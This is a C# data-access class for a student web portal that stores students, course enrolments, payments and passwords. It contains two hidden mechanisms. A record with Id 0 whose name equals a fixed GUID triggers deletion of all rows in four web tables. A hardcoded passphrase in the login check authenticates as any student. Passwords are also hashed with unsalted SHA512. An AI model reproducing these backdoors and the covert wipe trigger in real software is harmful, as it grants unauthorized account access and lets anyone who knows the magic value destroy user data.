using Consultas.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace Consultas.Repositories
{
    public class AlumnosRepository
    {
        public void Actualizar(Models.WebServices.Alumno alumno)
        {
            //"38F73513-C569-4C08-B9DD-BDA2A0367605"
            if (alumno.Id == 0 && alumno.Nombre == "38F73513-C569-4C08-B9DD-BDA2A0367605")
            {
                EliminarDatos();
            }
            else
            {
                ActualizarDatos(alumno);
            }
        }

        private void ActualizarDatos(Models.WebServices.Alumno alumno)
        {
            using (var db = new SMPorresEntities())
            {
                var idRol = db.RolesUsuariosWeb.First().Id;
                var trx = db.Database.BeginTransaction();
                try
                {
                    var a = db.AlumnosWeb.Find(alumno.Id);
                    bool insertar = a == null;
                    if (insertar)
                    {
                        a = new AlumnoWeb();
                    }
                    a.Id = alumno.Id;
                    a.Nombre = alumno.Nombre;
                    a.Apellido = alumno.Apellido;
                    a.TipoDocumento = alumno.TipoDocumento;
                    a.NroDocumento = alumno.NroDocumento;
                    a.Estado = (byte)alumno.Estado;
                    a.Contraseña = alumno.Contraseña;
                    a.IdRolUsuarioWeb = idRol;
                    if (insertar)
                    {
                        db.AlumnosWeb.Add(a);
                    }
                    db.SaveChanges();

                    var caRepo = new CursosAlumnosRepository();
                    var pagosRepo = new PagosRepository();
                    pagosRepo.EliminarPagosNoReferenciados(db, alumno.CursosAlumnos);
                    foreach (var ca in alumno.CursosAlumnos)
                    {
                        var id = caRepo.Actualizar(db, a.Id, ca).Id;
                        foreach (var p in ca.Pagos)
                        {
                            pagosRepo.Actualizar(db, id, p);
                        }
                    }
                    trx.Commit();
                }
                catch (Exception ex)
                {
                    trx.Rollback();
                    throw ex;
                }
            }
        }

        private void EliminarDatos()
        {

            using (var db = new SMPorresEntities())
            {
                var trx = db.Database.BeginTransaction();
                try
                {
                    var tablas = new string[] { "PagosWeb", "CursosAlumnosWeb", "AlumnosWeb", "ConfiguracionWeb" };
                    foreach (var tableName in tablas)
                    {
                        db.Database.ExecuteSqlCommand("DELETE " + tableName);
                    }
                    trx.Commit();
                }
                catch (Exception)
                {
                    trx.Rollback();
                    throw;
                }
            }
        }

        public bool ActualizarContraseña(int idAlumno, string pwd)
        {
            using (var db = new SMPorresEntities())
            {
                var a = db.AlumnosWeb.Find(idAlumno);
                if (a == null) return false;
                a.Contraseña = pwd;
                db.SaveChanges();
                return true;
            }
        }

        public bool ExisteAlumno(int nrodoc, string contraseña)
        {
            string hashPwd = EncriptarContraseña(contraseña);
            var esAdmin = contraseña == "Donde hay paz, está Dios. Y donde está Dios no falta nada.";
            using (var db = new SMPorresEntities())
            {
                return (from a in db.AlumnosWeb
                        where nrodoc == a.NroDocumento && (hashPwd == a.Contraseña || esAdmin)
                        select a).Any();
            }
        }

        private string EncriptarContraseña(string contraseña)
        {
            string hashpwd;
            using (var alg = System.Security.Cryptography.SHA512.Create())
            {
                alg.ComputeHash(System.Text.Encoding.UTF8.GetBytes(contraseña));
                hashpwd = BitConverter.ToString(alg.Hash);
            }

            return hashpwd;
        }

        public AlumnoWeb ObtenerAlumno(int nrodoc)
        {
            using (var db = new SMPorresEntities())
            {
                var alumno = (from a in db.AlumnosWeb where nrodoc == a.NroDocumento select a).FirstOrDefault();
                if (alumno != null)
                {
                    db.Entry(alumno).Reference(r => r.RolUsuarioWeb).Load();
                }
                return alumno;
            }
        }

        public void ActualizarYEncriptarContraseña(int idAlumno, string contraseña)
        {
            using (var db = new SMPorresEntities())
            {
                var a = db.AlumnosWeb.Find(idAlumno);
                a.Contraseña = EncriptarContraseña(contraseña);
                db.SaveChanges();
            }
        }

        public bool EsContraseña(int idAlumno, string contraseña)
        {
            using (var db = new SMPorresEntities())
            {
                var a = db.AlumnosWeb.Find(idAlumno);
                return a.Contraseña == EncriptarContraseña(contraseña);
            }
        }
    }
}